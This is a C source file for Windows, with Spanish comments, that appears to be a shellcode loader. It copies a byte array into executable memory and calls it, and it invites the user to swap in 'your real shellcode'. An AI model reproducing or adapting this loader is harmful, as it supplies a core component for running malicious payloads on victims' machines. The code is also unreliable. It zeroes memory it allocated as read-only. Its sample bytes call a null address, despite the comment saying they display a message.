#define WIN32_LEAN_AND_MEAN
#include <windows.h>

/* Funciones básicas sin CRT */
static void *xalloc(SIZE_T n) { return HeapAlloc(GetProcessHeap(), 0, n); }
static void xfree(void *p) { if (p) HeapFree(GetProcessHeap(), 0, p); }
static void xzero(void *p, SIZE_T n) {
    volatile unsigned char *d = (volatile unsigned char *)p;
    while (n--) *d++ = 0;
}

/* Ejecuta shellcode directamente en el proceso actual */
static int execute_shellcode(const unsigned char *sc, SIZE_T sc_len) {
    LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    if (!mem) return 0;

    if (!WriteProcessMemory(GetCurrentProcess(), mem, sc, sc_len, NULL)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return 0;
    }

    // Ejecutar el shellcode
    typedef void (*shellcode_func)();
    shellcode_func func = (shellcode_func)mem;
    func();

    // Limpiar
    xzero(mem, sc_len);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 1;
}

/* Punto de entrada */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // Shellcode de ejemplo (debes reemplazar esto con tu shellcode real)
    // Este es solo un ejemplo que muestra un mensaje
    unsigned char shellcode[] = {
        0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20,
        0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xB8,
        0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x83,
        0xC4, 0x20, 0x5D, 0xC3
    };

    // Ejecutar el shellcode
    if (!execute_shellcode(shellcode, sizeof(shellcode))) {
        MessageBoxA(NULL, "Error ejecutando shellcode", "Error", MB_ICONERROR);
        return 1;
    }

    return 0;
}